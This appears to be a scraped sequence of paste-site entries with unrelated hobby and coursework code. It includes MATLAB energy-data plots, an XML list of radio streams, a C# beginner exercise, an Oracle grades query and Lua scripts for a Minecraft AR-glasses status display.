    plot(datosFecha, datos.Production, 's-', 'LineWidth', 2, 'DisplayName', 'Dato2');
    hold off;
    xlabel('Tiempo (días)');
    ylabel('Energía');
    legend('Consumption', 'Production'); 
end



function graficarPorHoraFull(datos) 
    datosResp = datos
    %datos.Hora = hour(datos.Fecha);
    figure;
    hold on;
    plot(datos.Hora, datos.Consumption, 'k-', 'LineWidth', 0.5, 'DisplayName', 'Dato1');    
    datos = groupsummary(datos, 'Hora', 'mean');
    plot(datos.Hora, datos.mean_Consumption,'r-', 'LineWidth', 2, 'DisplayName', 'Dato1');
    hold off;
    xlabel('Tiempo (hora del día)');
    ylabel('Energía');
    legend('diario', 'promedio'); 


    figure;
    hold on;
    %datos = groupsummary(datos, 'Hora', 'mean');
    datos =datosResp
    plot(datos.day, datos.HDD,'b-', 'LineWidth', 2, 'DisplayName', 'Dato1');
    hold off;
    xlabel('Tiempo (hora del día)');
    ylabel('Energía');
    legend('diario', 'promedio');     
end

function graficarPorDayofweekFull(datos) 
    %datos.Hora = hour(datos.Fecha);
    figure;
    hold on;
    datos
    datos = groupsummary(datos, ['day'], 'mean', 'Consumption');
    plot(datos.day, datos.mean_Consumption, 'k-', 'LineWidth', 0.5, 'DisplayName', 'Dato1');
    %datos = groupsummary(datos, ['day'], 'mean', 'Consumption');
    datos
    
    plot(datos.day, datos.mean_Consumption,'r-', 'LineWidth', 2, 'DisplayName', 'Dato1');
    hold off;
    xlabel('Tiempo Dia de la semana');
    ylabel('Energía');
    legend('diario', 'promedio'); 
end




function graficarPorDiaMasPromedioFull(datos) 
    %datos.Hora = hour(datos.Fecha);
    datos
    figure;
    hold on;
    plot(datos.FechaHora, datos.Consumption, 'k-', 'LineWidth', 0.5, 'DisplayName', 'Dato1');
    datos = groupsummary(datos, 'FechaHora', 'mean');
    plot(datos.FechaHora, datos.mean_Consumption,'r-', 'LineWidth', 2, 'DisplayName', 'Dato1');
    hold off;
    xlabel('Tiempo (hora del día)');
    ylabel('Energía');
    legend('diario', 'promedio'); 
end

function graficarPromediosPorHoraFull(datos) 
    %datos.Hora = hour(datos.Fecha);
    datos = groupsummary(datos, 'Hora', 'mean');
    figure;
    %datosFecha = datetime(datos.DateTime, 'InputFormat', 'yyyy-MM-dd HH:mm:ss'); %2019-01-01 03:00:00
    
    plot(datos.Hora, datos.mean_Consumption, 'r-', 'LineWidth', 1, 'DisplayName', 'Dato1');
    hold on;
    plot(datos.Hora, datos.mean_Production, 'b-', 'LineWidth', 1, 'DisplayName', 'Dato2');
    plot(datos.Hora, datos.mean_Nuclear, 'r-', 'LineWidth', 1, 'DisplayName', 'Dato2');
    plot(datos.Hora, datos.mean_Wind, 'g-', 'LineWidth', 1, 'DisplayName', 'Dato2');
    plot(datos.Hora, datos.mean_Hydroelectric, 'y-', 'LineWidth', 1, 'DisplayName', 'Dato2');
    plot(datos.Hora, datos.mean_OilAndGas, 'c-', 'LineWidth',1, 'DisplayName', 'Dato2');
    plot(datos.Hora, datos.mean_Coal, 'm-', 'LineWidth', 1, 'DisplayName', 'Dato2');
    plot(datos.Hora, datos.mean_Solar, 'b-', 'LineWidth', 1, 'DisplayName', 'Dato2');
    plot(datos.Hora, datos.mean_Biomass, 'k-', 'LineWidth', 1, 'DisplayName', 'Dato2');

    hold off;
    xlabel('Tiempo (hora del día)');
    ylabel('Energía');
    legend('Consumption', 'Production', 'Nuclear', 'Wind', 'Hydroelectric', 'OilAndGas', 'Coal', 'Solar', 'Biomass'); 
end

function graficarPorDiaFull(datos) 
    figure;
    datosFecha = datetime(datos.DateTime, 'InputFormat', 'yyyy-MM-dd HH:mm:ss'); %2019-01-01 03:00:00
    %datos.Hora = hour(datos.Fecha);
    plot(datosFecha, datos.Consumption, 'r-', 'LineWidth', 1, 'DisplayName', 'Dato1');
    hold on;
    plot(datosFecha, datos.Production, 'b-', 'LineWidth', 1, 'DisplayName', 'Dato2');
    plot(datosFecha, datos.Nuclear, 'r-', 'LineWidth', 1, 'DisplayName', 'Dato2');
    plot(datosFecha, datos.Wind, 'g-', 'LineWidth', 1, 'DisplayName', 'Dato2');
    plot(datosFecha, datos.Hydroelectric, 'y-', 'LineWidth', 1, 'DisplayName', 'Dato2');
    plot(datosFecha, datos.OilAndGas, 'c-', 'LineWidth',1, 'DisplayName', 'Dato2');
    plot(datosFecha, datos.Coal, 'm-', 'LineWidth', 1, 'DisplayName', 'Dato2');
    plot(datosFecha, datos.Solar, 'b-', 'LineWidth', 1, 'DisplayName', 'Dato2');
    plot(datosFecha, datos.Biomass, 'k-', 'LineWidth', 1, 'DisplayName', 'Dato2');

    hold off;
    xlabel('Tiempo (días)');
    ylabel('Energía');
    legend('Consumption', 'Production', 'Nuclear', 'Wind', 'Hydroelectric', 'OilAndGas', 'Coal', 'Solar', 'Biomass'); 
end

function histograma(datos, texto)
    figure;
    % Crear un histograma
    histObj = histogram(datos, 'Normalization', 'pdf');
    
    % Obtener los bordes de los contenedores y las probabilidades
    bordes_contenedores = histObj.BinEdges;
    probabilidades = histObj.Values;
    
    % Ajustar una distribución de probabilidad (por ejemplo, ajuste normal)
    ajuste_normal = fitdist(datos, 'Normal');
    
    % Calcular la PDF de la distribución ajustada
    x = linspace(min(datos), max(datos), 100);
    pdf_ajustada = pdf(ajuste_normal, x);
    
    % Graficar el histograma y la distribución ajustada
    
    bar(bordes_contenedores(1:end-1), probabilidades, 'hist');
    hold on;
    plot(x, pdf_ajustada, 'r', 'LineWidth', 2);
    xlabel(strcat('Datos: ',' ',texto));
    ylabel(strcat('Densidad de probabilidad ',''));
    title(strcat('Distribución de Densidad y Ajuste:  ',texto));
    legend('Histograma', 'Distribución Ajustada');
    hold off;
end

%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%Utiles

function X_norm = minMaxScaler(X, newMin, newMax)
    % Normalizar los datos utilizando Min-Max Scaler
    
    if nargin < 2
        newMin = 0;  % Valor mínimo por defecto
        newMax = 1;  % Valor máximo por defecto
    end
    
    X_min = min(X);
    X_max = max(X);
    
    X_norm = (X - X_min) ./ (X_max - X_min) * (newMax - newMin) + newMin;
end"
LQm3uWLu,radito.xml,csalasj,XML,Tuesday 2nd of January 2024 09:15:11 PM CDT,"Radio Mahananda 98.8 Fmaudio/mpeg192441002http://chandra.shoutca.st:8110/rm_autodj.mp3undefinedUnspecifiedRadio Kamchatka Liveaudio/aac16000http://23.105.253.236:8100/chilloutTulku - Ghost DanceChilloutOnline Radioaudio/mpeg9600http://youtube.sunucupanel.com:1180/streamArabesk 40Saat-002-001variousRaadio 4audio/mpeg000http://icecast.err.ee:80/raadio4.mp3BLIND MELON - No RainvariousRooster 101 - Cayman Countryaudio/mpeg19200http://fusion.shoutca.st:8064/streamCountryRadio Lider Internacional 101.5 FMaudio/aac64441002http://sv2.globalhostlive.com:7079/autodjDesconocido - LEJANIAVariedadradio Paradiseaudio/mpeg32000http://stream.mfmstreaming.nl:1190/streamDanny Terp - Jij Geeft Me Vleugelsalles wat vanWest Bremer Radioaudio/aacp12800http://icecast01.goanna.network:8000/wbrMeghan Trainor - Lips Are MovinRadio LocalSTREAM 10220audio/mpeg0480002http://pstnet1.shoutcastnet.com:10220/stream0000000Chill House Mix 16MISCRadio Promo Artiste TV Webaudio/mpeg12800http://ecmanager3.pro-fhi.net:2260/streamArtiste inconnu - Piste 2variousGround Level Radioaudio/mpeg12800http://c21.radioboss.fm:8079/autodjmisse - ( 04 06 2020 )OtherUnspecified nameaudio/mpeg19200http://s01.diazol.hu:9040/autodjDeejay%20NightVariousRadioDuburcqaudio/mpeg128441002http://stream3.vestaradio.com:8091/RadioDuburcqDadju - Bobo au cAurActualitésUnspecified nameaudio/aac128441002http://maggie.torontocast.com:19026/streamArun - Tumi Yadi Nahi Ele #2747variousRadio Kyiv 98FMapplication/mp332000http://cdn.vsnw.net:8090/kyiv_fm_320kDanceMB STUDIOaudio/mpeg12800http://nr14.newradio.it:8740/streamTwolate - Pala Pala (Extended Mix)Popstreamaudio/mpeg6400http://jm8n.com:8148/autodjReik - Ya Me Enteré letragenre DefaultCasa MarÃ­a del Caminante Radio.audio/mpeg128441002http://s1.voscast.com:10338/streamy2mate.com - Villancicos De Navidad Clásicos Canciones De Navidad Populares Música Navideña En EspañolAssortedCIDADE 87,9 FMaudio/aacp12800http://stm01.virtualcast.com.br:8276/liveNow Playing info goes herePOPULAR+58MIX Streamaudio/mpeg128441002http://topradio.uno:8057/autodjADOLECENTES - ARREPENTIDA ADO.Mas58 Mix011.FM - Classic Countryaudio/mpeg19200https://listen.011fm.com/2662_192.mp3Rodney Crowell - Things I Wish I'd Said Contemporary AdultHearMe - Adult Contemporary Popaudio/mpeg128441002http://hearme.fm:8592/streamContemporary AdultRecordheadz Sessionsaudio/aac128441002http://hello.citrus3.com:8318/streamRobbie Rivera - Rock the Disco (David Guetta Laptop Remix)ElectronicHip Hop Muzic Hubaudio/mpeg12800http://c11.radioboss.fm:8187/autodjLola Brooke feat. Bryson Tiller - YouRnB Hip HopFamilyRadioaudio/mpeg12800http://www.clubfmserver.be:8000/family.mp3FamilyRadio - Bij ons ben je thuis!variousThe Freakin Sweet Family Guy Stream! (by AvsFan)video/nsv60000http://ice2.redswim.info:8030/ptvFamily Guy S03E07 Lethal Weapons ShowsMaxis Favouritesaudio/mpeg128441002http://s2.reliastream.com:8038/autodjSOFTNEZEE-PG - 02UnspecifiedDefault Streamaudio/mpeg64441002http://s7.voscast.com:8854/streamBiper y sus Amigos - Biper y sus Amigos - Obedece A Tu Mam, Obedece A Tu Pap! - El Patito JuanCHRISTIAN RADIO▶:audio/aac24441002http://panelradio.online:8118/aac_autodjEL LUPE - ZANDUNGAUnspecifiedOnline Radioaudio/aacp6400http://ec1.everestcast.host:1090/streamClean Bandit x Topic feat. Wes Nelson - DrivevariousAgaune Radioaudio/mpeg32000http://ecmanager3.pro-fhi.net:2640/streamJEREMY FREROT - J'ai la mervariousRISE FMaudio/mpeg9600http://188.165.11.30:8080/risefm_hithouse_lqBLOCK & CROWN, CHRIS MARINA - JUST A MAN (CLUB MIX)Hit HouseRadio Gospelaudio/aac128441002http://cast.radiu.live:7000/streamBoa Noite Amor 01GospelMedia Stad Deventeraudio/mpeg12800http://stream.mediastaddeventer.nl:8000/mp3Marianne Rosenberg - Ich Bin Wie Du10s 60s 70s 20s 00s 90s Pop 80sRadio La Voz del Puebloaudio/aacp4800http://sv2.globalhostlive.com:7012/liveLa Voz del Pueblo - En vivoVariedadMark Radioaudio/aac128441002http://s7.citrus3.com:8002/streamAdam And The Ants - Desparate But Not SeriousClassic AlternativeArabella 90eraudio/aac000http://frontend.streams.arabella.at/arabella-90er/stream/aacp?aggregator=icecastdirectory"
4yRbdEtp,Untitled,artemsemkin,CSS,Tuesday 2nd of January 2024 09:11:19 PM CDT,"[data-widget_type*=""rhye""] .swiper-container-vertical.swiper-container-initialized > .swiper-wrapper, [data-widget_type*=""rhye""] .swiper-container-horizontal.swiper-container-initialized > .swiper-wrapper {
  overflow: initial !important;
}

[data-widget_type*=""rhye""] .swiper-vertical.swiper-initialized.slider-fullscreen-projects__images > .swiper-wrapper, [data-widget_type*=""rhye""] .swiper-horizontal.swiper-initialized.slider-fullscreen-projects__images > .swiper-wrapper {
  overflow: initial !important;
}
"
QDgMrNLL,C#_1_lesson_clinic,Legiomax,C#,Tuesday 2nd of January 2024 09:07:49 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace C_Ijun
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int countGrandMothers;
            int timeWaitHours;
            int timeWaitMinutes;
            Console.Write(""Введите количество старушек в очереди: "");
            countGrandMothers = Convert.ToInt32(Console.ReadLine());
            timeWaitHours = (10 * countGrandMothers) / 60;
            timeWaitMinutes = (10 * countGrandMothers) % 60;
            Console.WriteLine(""Вы должны отстоять в очереди "" + timeWaitHours + "" часа и "" + timeWaitMinutes + "" минут."");
            Console.ReadLine();
        }
    }
}
"
d3TeSJ46,Untitled,ma39isy,Oracle 11,Tuesday 2nd of January 2024 09:01:26 PM CDT,"SELECT * FROM
					( SELECT STUDENTID, SUBJECTCODE, SUBJECTNAME, STUDYPROGRAMNAME, SCHOOLPERIODE, INDEXPOINT, SUBJECTID, COURSESTUDYPROGRAMID, TOTALCHANGE, ACTIVESTATUS, ACTIVESTATUS1, EVIDANCEURL, ROWNUM rnum,TOTALROWS FROM
					(
                        SELECT ZZZ.*,count(*) over () TOTALROWS FROM (
					        select * from (SELECT FG.*, (FG.SCHOOLYEAR||'/'||FG.SEMESTER) SCHOOLPERIODE, C.TOTALCHANGE, C.ACTIVESTATUS1, EVIDANCEURL FROM FINALGRADE_ALL_STATUS FG
        LEFT JOIN (
            SELECT
            STUDENTID,
            SUBJECTID,
            ACTIVESTATUS AS ACTIVESTATUS1,
            EVIDANCEURL,
            SCHOOLYEAR,
            SEMESTER,
            COUNT( STUDENTID ) TOTALCHANGE 
        FROM
            COMPLETECOURSEPOINTCHANGE 
        WHERE
            APPROVALSTATUS IS NULL 
        GROUP BY
            STUDENTID,
            SUBJECTID,
            SCHOOLYEAR,
            SEMESTER,
            ACTIVESTATUS,
            EVIDANCEURL
        ) C ON (FG.STUDENTID=C.STUDENTID AND FG.SUBJECTID=C.SUBJECTID AND FG.SCHOOLYEAR=C.SCHOOLYEAR AND FG.SEMESTER=C.SEMESTER)
        WHERE FG.STUDENTID = '103012380554'  )  
                        )ZZZ

					) a
					WHERE ROWNUM <= 20 )
					WHERE rnum  >= 1"
up5G20wy,glasses bk.lua,ComboMaster,Lua,Tuesday 2nd of January 2024 08:30:51 PM CDT,"local component = require(""component"")
local fs = require(""filesystem"")
local computer = require(""computer"")
local bridge = component.openperipheral_bridge
local RefreshGlasses = 2
local gpu = component.gpu
local items = {
  {""dwcity:Materia"", 0},
  {""minecraft:iron_ingot"", 0},
  {""DraconicEvolution:draconicIngot"", 0},
}
 
local players = {
  {""cheburek228tr"", false},
  {""combomaster"", false},
}
local chat_box, me, radar, counter
local average, me_a, cb, r = false, false, false, false
-------------{TIME OPTIONS}------------------
local TIME_ZONE = 3 -- часовой пояс
---------------------------------------------
 local settings = {
    tps = true,
}
---------------------------------------------
local t_correction = TIME_ZONE * 3600
local chat_box_name = ""§8[§4Алиса§8]""
local adm = ""combomaster"" -- Ник админа компа
local allow_mem = falce -- Отображать на экране кол-во памяти или нет
local localize = {
  tps = ""TPS:"",
  avg_tps = ""Avg TPS:"",
  time = ""§9Время:"",
  join_in_game = "" §7вошел в игру!"",
  left_from_game = "" §7покинул игру!"",
  user_online = ""✓"",
  user_offline = ""✕"",
  near_ME = ""Радар""
}
local colors = {
    red = 0x0000FF, --------
    orange = 0x0080FF, ----- тпс
    green = 0x00FF00, ------
    item_size = 0x05F5F0, -- кол-во предметов
    eu = 0x5555FF, -- еу/т
    mem = 0xFFFFFF, -- память
    time = 0xFFFF00, --Время
    time_text = 0xFFFF00, -- текст ""Время МСК:""(пример)
    online = 0x008000, --онлайн на очках
    offline = 0xB22222, -- оффлайн на очках
    near = 0xFFFF00, --текст ""Игроки рядом с МЭ""
    players_near = 0xFFFF00, -- цвет игроков рядом
    players = 0x05F5F0 -- цвет игроков в Online/offline 0xFFFFFF
}

	function len(table)
	local size = 0
	for _ in pairs(table) do size 1 end
	return size
    
end

local function digital(n)
  local text='123'
  for f in string.gmatch(n,'%d') do text=text..f end
  return text
end
 
function check()
  if component.isAvailable(""average_counter"") then
    average = true
    counter = component.average_counter
  end
  if component.isAvailable(""chat_box"") then
    cb = true
    chat_box = component.chat_box
    chat_box.setName(chat_box_name)
  end
  if component.isAvailable(""me_controller"") then
    me_a = true
    me = component.me_controller
  end
  if component.isAvailable(""radar"") then
    r = true
    radar = component.radar
  end
  componentsOnScreen()
end
 
local function getTimeHost()
  local file = io.open('/tmp/UNIX.tmp', 'w')
  file:write('TIME_ZONE = '..TIME_ZONE)
  file:close()
  local lastmod = tonumber(string.sub(fs.lastModified('/tmp/UNIX.tmp'), 1, -4)) + t_correction
  local dt = os.date('%H:%M:%S', lastmod)
  return dt
end

function addBox(x, y, w, h, color, tran)
  bridge.addBox(x, y, w, h, color, tran)
end
 
function addText(x, y, text, color)
  bridge.addText(x, y, text, color)
end
 
function addIcon(x, y, name, meta)
  bridge.addIcon(x, y, name, meta)
end
 
function gui()
  w, h = gpu.maxResolution()
  gpu.fill(1, 1, w, h, "" "")
end
 
function componentsOnScreen()
  gpu.set(1, 1, ""Chat-box: "" .. tostring(cb))
  gpu.set(1, 2, ""ME: "" .. tostring(me_a))
  gpu.set(1, 3, ""Radar: "" .. tostring(r))
  gpu.set(1, 4, ""Counter: "" .. tostring(average))
  gpu.set(1, 5, ""TPS: "" .. tostring(settings.tps))
end
 
function addAllIcons()
  y = 25
  for i = 1, #items do
    y = y + 15
    addIcon(2, y, items[i][1], items[i][2])
  end
end
 
function getSize(name,dmg)
 for _, item in ipairs(me.getItemsInNetwork()) do
  if item.name == name and item.damage == dmg then
   return item.size
  end
 end
 return 0
end
-----------------------------------------------------------
	local function getTPS()   
	local timeConstant = 1
	local realTimeOld = 0
	local realTimeNew = 0
	local realTimeDiff = 0
	local TPS = 0
	local newColor
    
    end
    
timeConstant = 1
joke = 0
tSlot = 1
TPS = {}
avgTPS = 0

for tSlot=1,10 do
    TPS[tSlot]=0
end


local function time()
local f = fs.open(""/tmp/timeFile"",""w"")
f:write(""test"")
f:close()
return(fs.lastModified(""/tmp/timeFile""))
    
end

-----------------------------------------------------------
function getTPS()
    realTimeOld = time()
    os.sleep(timeConstant)
    realTimeNew = time()
    realTimeDiff = realTimeNew-realTimeOld
    TPS[tSlot] = 20000*timeConstant/realTimeDiff
    avgTPS = (TPS[1]+TPS[2]+TPS[3]+TPS[4]+TPS[5]+TPS[6]+TPS[7]+TPS[8]+TPS[9]+TPS[10])/10
    local TPShow = tonumber(string.format(""%.2f"", tonumber(TPS[tSlot])))
    if TPShow >= 15 then newColor = colors.green end
    if TPShow >= 10 and TPShow < 15 then newColor = colors.orange end
    if TPShow < 10 then newColors = colors.red end 
     return {tostring(TPShow), newColor}
    
    end

-----------------------------------------------------------------------------------
function setEnergy()
  addIcon(0, 25, ""AdvancedSolarPanel:BlockMolecularTransformer"", 0)
  if counter.getAverage() / 1000 <= 1 then
    av = string.format(""%.3f"", tostring(counter.getAverage())) .. ""EU/t""
  elseif counter.getAverage() / 1000000 >= 1 then
    av = string.format(""%.3f"", tostring(counter.getAverage() / 1000000)) .. ""MEU/t""
  else
    av = string.format(""%.1f"", tostring(counter.getAverage() / 1000)) .. ""kEU/t""
  end
  addText(25, 27, av, colors.eu)
end
-----------------------------------------------------------------------------------
Local TPStable = getTPS()
box(1,1,104,15,colors.green,0.3)
text(60,5,""TPS: "",colors.near)
-----------------------------------------------------------------------------------
function setTime()
  addText(5, 110, localize.time, colors.time_text)
  addText(40, 110, getTimeHost(), colors.time)
end
 
function freeMemory()
  if allow_mem then
    addText(0, 12, ""MEM: ""..math.floor((computer.freeMemory() / 1000))..""mb""..""/""..math.floor((computer.totalMemory() / 1000))..""mb"".."" ""..math.floor(((computer.freeMemory() / computer.totalMemory()) * 100))..""%"", colors.mem)
  end
end
 
function checkOnline(n)
  computer.removeUser(adm)
  if computer.addUser(players[n][1]) then
    computer.removeUser(players[n][1])
    if players[n][2] == false then
      if cb then
        chat_box.say(""§a""..players[n][1] .. localize.join_in_game)
      end
      players[n][2] = true
    end
    return true
  else
    if players[n][2] == true then
      if cb then
        chat_box.say(""§c""..players[n][1] .. localize.left_from_game)
      end
      players[n][2] = false
    end
    computer.removeUser(players[n][1])
    return false
  end
end
 
function drawOnline()
  yy = 120
  for i = 1, #players do
    yy = yy + 10
    if checkOnline(i) then
      addText(5, yy, players[i][1], colors.online)
    else
      addText(5, yy, players[i][1], colors.offline)
    end
  end
end
 
function getPlayersNearME()
  addText(5, 170, localize.near_ME, colors.near)
  a = 180
  temp = radar.getPlayers()
  for i = 1, #temp do
    a = a + 10
    for j = 1, #players do
      if temp[i].name == players[j][1] then
        return
      else
        addText(5, a, temp[i].name.."" ""..math.floor(temp[i].distance).."", ""..""м"", colors.players_near)
      end
    end
  end
end
 
check()
bridge.clear()
addBox(0, 0, 100, 100, 0xFFFFFF, 0)
addAllIcons()
bridge.sync()
gui()
 
while true do
  check()
  computer.addUser(adm)
  bridge.clear()
  if me_a then
    addAllIcons()
    y = 27
    for i = 1, #items do
      y = y + 15
      addText(25, y, getSize(items[i][1], items[i][2]), colors.item_size)
    end
  if settings.tps then
      getTPS()
    end
  end
  if average then
    setEnergy()
    end
  setTime()
  drawOnline()
  bridge.addBox(0,100,100,170,0x000000,0.2)
  freeMemory()
  if r then
    getPlayersNearME()
   end
  os.sleep(0.001)
  bridge.sync()
end"
xR07zmUb,gl1 test,ComboMaster,Lua,Tuesday 2nd of January 2024 08:00:07 PM CDT,"local component = require(""component"")
local fs = require(""filesystem"")
local computer = require(""computer"")
--local chatOnGlassesLib = require(""ChatOnGlassesLib"")
local gpu = component.gpu

local items = {
    {id = ""dwcity:Vis_materia"", dmg = 0},
    {id = ""customnpcs:npcMoney"", dmg = 0}
}
local players = {
    { name = ""Krobys"", isJoin = true, isHideOnline = true},
    { name = ""OSSO"", isJoin = false, isHideOnline = false},
    { name = ""PREVESHE"", isJoin = false, isHideOnline = false}
}
local peripherals = {
    chat_box = nill,
    me_interface = nill,
    sensor = nill,
    bridge = component.openperipheral_bridge
}
local settings = {
    tps = true,
    me_items = true,
    sensor_players = true,
    player_items = true,
    chat_box = true,
    local_chat = true,
    memory_monitoring = true,
    admin = ""combomaster"",
    chat_box_name = ""§8[§4Алиса§8]""
}
defaultSlotValue = 18
local constraints = {
    leftBorderAbsolute = defaultSlotValue / 2,
    topBorderAbsolute = defaultSlotValue / 2,

    timeTextWidth = defaultSlotValue * 5,
    --timeValueWidth = defaultSlotValue * 5,--not using now

    nickname_width = defaultSlotValue * 4,
    online_value_width = defaultSlotValue * 3,

    tpsTextWith = defaultSlotValue * 3,
    tpsValueWidth = defaultSlotValue * 2,

    me_item_width = defaultSlotValue * 4,

    players_near_title_width = defaultSlotValue * 5,

    monitoring_me_title_width = defaultSlotValue * 5,

    status_player_title_width = defaultSlotValue * 5,
    status_player_box_width = defaultSlotValue,

    memory_status_width = defaultSlotValue * 6
}
-------------{TIME OPTIONS}------------------
local TIME_ZONE = 0 --Ваш часовой пояс
local t_correction = TIME_ZONE * 3600
---------------------------------------------

local localize = {
    time = ""§9Время:"",
    tps = ""TPS:"",
    avg_tps = ""Avg TPS:"",
    join_in_game = "" §7вошел в игру!"",
    left_from_game = "" §7покинул игру!"",
    user_online = ""online"",
    user_offline = ""offline"",
    near_ME = ""Игроки рядом"",
    monitoring_me_title = ""Мониторинг МЭ"",
    status_players_title = ""Статус игроков""
}
local colors = {
    time_color = 0x0000CD, --Время 00:00:00
    tps_title_color = 0x0000CD, --TPS и Avg TPS
    tps_value_color = 0x0000CD, --значения тпс цвет
    monitoring_me_title_color = 0x0000CD, --Мониторинг МЭ надпись
    monitoring_me_item_count_color = 0x0000CD, --Мониторинг МЭ цвет количества
    players_near_title_color = 0x0000CD, --Игроки поблизости цвет
    player_near_nickname_color = 0x0000CD, --Цвет никнейма игрока поблизости
    player_status_title_color = 0x0000CD, --Статус игроков цвет надписи
    player_status_nickname_color = 0x0000CD, --Никнейм статуса игроков цвет
    player_status_online_color = 0x00FF00, --цвет бокса при онлайн игроке
    player_status_offline_color = 0xFF0000, --цвет бокса при оффлайн игроке
    memory_info_color = 0x0000CD, --Память 200 MB/4134 MB - цвет
    memory_percent_color = 0x0000CD, --Проценты памяти 40% цвет

    white = 0xFFFFFF,
    charge_level_color = 0x55FF55, --заряд предметов цвет
    not_charge_level_color = 0x000000
}
--------------------------------------------
timeConstant = 1
joke = 0
tSlot = 1
TPS = {}
avgTPS = 0
for tSlot=1,10 do
    TPS[tSlot]=0
end
--------------------------------------------
local absoluteYIndex = constraints.topBorderAbsolute

function time()
    local f = fs.open(""/tmp/timeFile"",""w"")
    f:write(""test"")
    f:close()
    return(fs.lastModified(""/tmp/timeFile""))
end

local function drawSlot(x, y, slotWidth, slotHeight, textToDrawInSlot, textColorToDrawInSlot, bgColor)
    local borderColor = 0xFFFFFF
    local borderWidth = 1

    peripherals.bridge.addLine({ x, y }, { x, y + slotHeight }, borderColor)
    peripherals.bridge.addLine({ x + slotWidth, y }, { x + slotWidth, y + slotHeight }, borderColor)
    peripherals.bridge.addLine({ x, y }, { x + slotWidth, y }, borderColor)
    peripherals.bridge.addLine({ x, y + slotHeight }, { x + slotWidth, y + slotHeight}, borderColor)
    peripherals.bridge.addBox(x + borderWidth, y + borderWidth, slotWidth - 2, slotHeight - 2, bgColor or 0xCCCCCC, 0.5)

    if textToDrawInSlot and textColorToDrawInSlot then
        local marginTop = (slotHeight - 8) / 2
        addText(x + 3, y + marginTop, textToDrawInSlot, textColorToDrawInSlot)
    end
end

function check()
    if settings.chat_box then
        if component.isAvailable(""chat_box"") then
            peripherals.chat_box = component.chat_box
            peripherals.chat_box.setName(settings.chat_box_name)
        else
            settings.chat_box = false
        end
    end
    if settings.me_items then
        if component.isAvailable(""me_interface"") then
            peripherals.me_interface = component.me_interface
        else
            settings.me_items = false
        end
    end
    if settings.sensor_players then
        if component.isAvailable(""openperipheral_sensor"") then
            peripherals.sensor = component.openperipheral_sensor
        else
            settings.sensor_players = false
        end
    end
    componentsOnScreen()
end

function getFreeMemory()
    if settings.memory_monitoring then
        local current = math.floor((computer.freeMemory() / 1000))
        local total = math.floor((computer.totalMemory() / 1000))
        drawSlot(constraints.leftBorderAbsolute + constraints.timeTextWidth + constraints.status_player_title_width, constraints.topBorderAbsolute, constraints.memory_status_width, defaultSlotValue, ""MEM: ""..current..""mb""..""/""..total..""mb"", colors.memory_info_color)
        local freePercent = math.floor(((computer.freeMemory() / computer.totalMemory()) * 100))
        drawSlot(constraints.leftBorderAbsolute + constraints.timeTextWidth + constraints.status_player_title_width + constraints.memory_status_width, constraints.topBorderAbsolute, defaultSlotValue * 1.5, defaultSlotValue, freePercent .. ""%"", colors.memory_percent_color)
    end
end

local function getTimeHost()
    local file = io.open('/tmp/UNIX.tmp', 'w')
    file:write('TIME_ZONE = '..TIME_ZONE)
    file:close()
    local lastmod = tonumber(string.sub(fs.lastModified('/tmp/UNIX.tmp'), 1, -4)) + t_correction
    local dt = os.date('%H:%M:%S', lastmod)
    return dt
end

function addBox(x, y, w, h, color, tran)
    peripherals.bridge.addBox(x, y, w, h, color, tran)
end

function addText(x, y, text, color)
    peripherals.bridge.addText(x, y, text, color)
end

function addIcon(x, y, name, meta)
    peripherals.bridge.addIcon(x, y, name, meta)
end

function gui()
    w, h = gpu.maxResolution()
    gpu.fill(1, 1, w, h, "" "")
end

function componentsOnScreen()
    gpu.set(1, 1, ""Chat-box: "" .. tostring(settings.chat_box))
    gpu.set(1, 2, ""ME: "" .. tostring(settings.me_items))
    gpu.set(1, 3, ""Sensor: "" .. tostring(settings.sensor_players))
    gpu.set(1, 4, ""TPS: "" .. tostring(settings.tps))
end

function addMEInfo(network)
    drawSlot(constraints.leftBorderAbsolute, absoluteYIndex, constraints.monitoring_me_title_width, defaultSlotValue, localize.monitoring_me_title, colors.monitoring_me_title_color)
    absoluteYIndex = absoluteYIndex + defaultSlotValue
    if settings.me_items then
        for i = 1, #items do
            local itemCount = getSize(network, items[i].id, items[i].dmg)
            drawSlot(constraints.leftBorderAbsolute, absoluteYIndex, defaultSlotValue, defaultSlotValue)
            addIcon(constraints.leftBorderAbsolute + 1, absoluteYIndex + 1, items[i].id, items[i].dmg)
            drawSlot(constraints.leftBorderAbsolute + defaultSlotValue, absoluteYIndex, constraints.me_item_width, defaultSlotValue, itemCount, colors.monitoring_me_item_count_color)
            absoluteYIndex = absoluteYIndex + defaultSlotValue
        end
    end
end

function getSize(network,name,dmg)
    local count = 0
    for _, item in ipairs(network) do
        if item.name == name and item.damage == dmg then
            count = count + item.size
        end
    end
    return string.format(""%u"", count)
end

function setTime()
    local timeText = localize.time .. "" ""..getTimeHost()
    drawSlot(constraints.leftBorderAbsolute, absoluteYIndex, constraints.timeTextWidth, defaultSlotValue, timeText, colors.time_color)
    absoluteYIndex = absoluteYIndex + defaultSlotValue
end

function checkOnline(n)
    computer.removeUser(settings.admin)
    if computer.addUser(players[n].name) then
        computer.removeUser(players[n].name)
        if not players[n].isJoin then
            if cb then
                chat_box.say(""§a""..players[n].name .. localize.join_in_game)
            end
            players[n].isJoin = true
        end
        return true
    else
        if players[n].isJoin then
            if cb then
                chat_box.say(""§c""..players[n].name .. localize.left_from_game)
            end
            players[n].isJoin = false
        end
        computer.removeUser(players[n].name)
        return false
    end
end

function drawOnline()
    absoluteYIndex = constraints.topBorderAbsolute
    drawSlot(constraints.timeTextWidth + constraints.leftBorderAbsolute, absoluteYIndex, constraints.status_player_title_width, defaultSlotValue, localize.status_players_title, colors.player_status_title_color)
    absoluteYIndex = absoluteYIndex + defaultSlotValue
    for i = 1, #players do
        if not players[i].isHideOnline then
            drawSlot(constraints.timeTextWidth + constraints.leftBorderAbsolute, absoluteYIndex, constraints.nickname_width, defaultSlotValue, players[i].name, colors.player_status_nickname_color)

            if checkOnline(i) then
                drawSlot(constraints.timeTextWidth + constraints.nickname_width + constraints.leftBorderAbsolute, absoluteYIndex, constraints.status_player_box_width, defaultSlotValue, nill, nill, colors.player_status_online_color)
            else
                drawSlot(constraints.timeTextWidth + constraints.nickname_width + constraints.leftBorderAbsolute, absoluteYIndex, constraints.status_player_box_width, defaultSlotValue, nill, nill, colors.player_status_offline_color)
            end
            absoluteYIndex = absoluteYIndex + defaultSlotValue
        end
